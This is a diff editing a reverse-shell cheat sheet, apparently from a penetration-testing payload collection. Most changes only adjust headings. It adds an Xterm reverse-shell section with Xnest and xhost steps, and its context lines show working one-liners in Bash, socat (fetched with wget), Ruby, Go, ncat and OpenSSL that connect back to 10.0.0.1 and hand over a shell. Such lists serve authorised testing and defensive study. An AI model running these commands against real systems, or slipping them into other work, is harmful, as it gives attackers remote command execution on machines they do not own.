@@ -1,6 +1,6 @@
 # Reverse Shell [Cheat Sheet]
+
 ## Bourne-Again Shell
-#
 ## Transmission Control Protocol
 ### Remote Host
 ```
@@ -20,7 +20,7 @@ sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 ```
 
 ## Socat
-#### Install Socat
+### Install Socat
 ```
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
@@ -123,7 +123,7 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1", 4242).to_i; exec sprintf("/bin/sh 
 
 ruby -rsocket -e'exit if fork; c=TCPSocket.new("10.0.0.1", "4242"); loop{c.gets.chomp!; (exit! if $_=="exit"); ($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
 ```
-#### Windows
+### Windows
 ```
 ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1", "4242"); while(cmd=c.gets); IO.popen(cmd, "r"){|io|c.print io.read}end'
 ```
@@ -131,6 +131,20 @@ ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1", "4242"); while(cmd=c.gets); IO.pop
 ## Golang
 ```
 echo 'package main; import"os/exec"; import"net"; func main(){c,_:=net.Dial("tcp", "10.0.0.1:4242"); cmd:=exec.Command("/bin/sh"); cmd.Stdin=c; cmd.Stdout=c; cmd.Stderr=c; cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+```
+
+## Xterm
+**One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.**
+```
+xterm -display 10.0.0.1:1
+```
+**To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system)**
+```
+Xnest :1
+```
+**You’ll need to authorise the target to connect to you (command also run on your host)**
+```
+xhost +<Target IP>
 ```
 
 ## Netcat Traditional
@@ -158,7 +172,6 @@ ncat 10.0.0.1 4242 -e /bin/bash
 ```
 ncat --udp 10.0.0.1 4242 -e /bin/bash
 ```
-
 ## OpenSSL
 ```
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
